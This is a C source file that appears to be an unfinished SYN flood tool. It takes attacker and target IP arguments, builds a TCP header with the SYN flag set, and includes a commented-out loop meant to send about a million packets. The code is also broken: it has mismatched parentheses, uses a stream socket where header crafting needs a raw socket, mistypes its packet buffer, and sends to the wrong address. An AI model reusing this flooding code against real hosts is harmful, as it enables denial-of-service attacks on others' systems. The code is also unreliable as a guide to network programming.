#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <dirent.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/wait.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/types.h>


#define SRC_PORT 40508
#define DEST_PORT 40508
#define BUFF_SIZE 512

int main(int argc, char *argv[]){
    int sock;
    struct sockaddr_in server_addr;
    socklen_t dataLenSock;
    char* buff[BUFF_SIZE];

    if (argc != 3) {
        printf("Incorrect number of arguments - only need two (source_ip destination_ip)\n");
        exit(0);
    }

    char* attacker_ip;
    char* target_ip;
    attacker_ip = argv[1];
    target_ip = argv[2];

    printf("The input is %s %s\n", attacker_ip, target_ip);

    struct iphdr *ip = (struct iphdr *) buff;
    struct tcphdr *tcp = (struct tcphdr *) buff + sizeof (struct iphdr));


    // CREATING THE SERVER SOCKET
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0){
        perror("Error in socket");
        exit(0);
    }
    // SET THE SERVER IP AND PORT
    bzero(&server_addr, sizeof(server_addr));
    server_addr.sin_family      = AF_INET;
    server_addr.sin_port        = htons(DEST_PORT);
    server_addr.sin_addr.s_addr = inet_addr(attacker_ip);

    memset(buff, 0, sizeof (buff));
    tcp -> source = htons(SRC_PORT); // source port
    tcp -> dest = htons(DEST_PORT); // destination port
    tcp -> seq = htons(random()); // inital sequence number
    tcp -> ack_seq = htons(0); // acknowledgement number
    tcp -> ack = 0; // acknowledgement flag
    tcp -> syn = 1; // synchronize flag
    tcp -> rst = 0; // reset flag
    tcp -> psh = 0; // push flag
    tcp -> fin = 0; // finish flag
    tcp -> urg = 0; // urgent flag
    tcp -> check = 0; // tcp checksum
    tcp -> doff = 5; // data offset


//    for(int i = 0; i < 100; i++){
//        for(int j = 0; j < 10000; j++){
//            int err = sendto(sock, buff, sizeof(struct iphdr), 0, (struct sockaddr *)&server_addr, sizeof(struct sockaddr)));
//            if(err < 0){
//                perror("error in sending the syn packet!");
//            }
//        }
//    }
    int err = sendto(sock, buff, sizeof(struct iphdr), 0, (struct sockaddr *)&server_addr, sizeof(struct sockaddr)));
    if(err < 0){
        perror("error in sending the syn packet!");
    }

}